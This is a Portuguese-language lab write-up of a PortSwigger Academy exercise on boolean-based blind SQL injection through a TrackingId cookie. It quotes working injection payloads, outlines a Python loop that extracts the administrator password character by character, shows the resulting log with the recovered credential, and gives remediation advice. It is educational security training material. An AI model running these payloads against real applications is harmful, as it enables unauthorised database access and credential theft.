Blind SQL Injection com Resposta Condicional | PortSwigger Academy

Laboratório da trilha de SQL Injection do PortSwigger Web Security Academy.

Sobre o Lab
A aplicação usa o cookie TrackingId para rastrear usuários. Esse valor é concatenado direto numa query SQL sem sanitização, ficando injetável.

A injeção é cega (blind)  o resultado da query não volta na página. A dica que a página dá é uma resposta condicional, a página retorna "Welcome back!" se a condição injetada for VERDADEIRA.

Objetivo: extrair a senha do usuário administrator da tabela users.

A Vulnerabilidade
Cookie: TrackingId=abc' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- 

Se o primeiro caractere for 'a' -> aparece "Welcome back!"
Se não for -> não aparece.

É um boolean-based blind clássico.

Exploração Manual
Confirmei a injeção: ' AND '1'='1'-- -> Welcome / ' AND '1'='2'-- -> sem welcome
Confirmei a tabela de usuários
Extração letra por letra usando SUBSTRING(password, pos, 1)

Automação
Em vez de usar o Intruder do Burp na mão para 20 posições x 36 caracteres, automatizei com Python:

requests mandando o payload no TrackingId
Verifica se "Welcome back" está no body da resposta
Loop da posição 1 até 20 testando a-z0-9

Log real da extração:
[+] pos 1: u
[+] pos 2: u5
[+] pos 3: u5n
...
[+] pos 20: u5nve1y47tte52gfwhtl
[FINAL] administrator:u5nve1y47tte52gfwhtl

O código da automação está no arquivo extractor.py desse repositório.

Como corrigir (visão de QA / Dev)
Usar queries parametrizadas / prepared statements
Nunca concatenar input do usuário (nem mesmo cookies) em SQL
Validar e sanitizar o TrackingId no backend

Aviso
Fins educacionais apenas. Testado em laboratório autorizado e isolado do PortSwigger Web Security Academy. Instâncias do lab são efêmeras.


Stack: Python, Burp Suite Community, Oracle SQL 

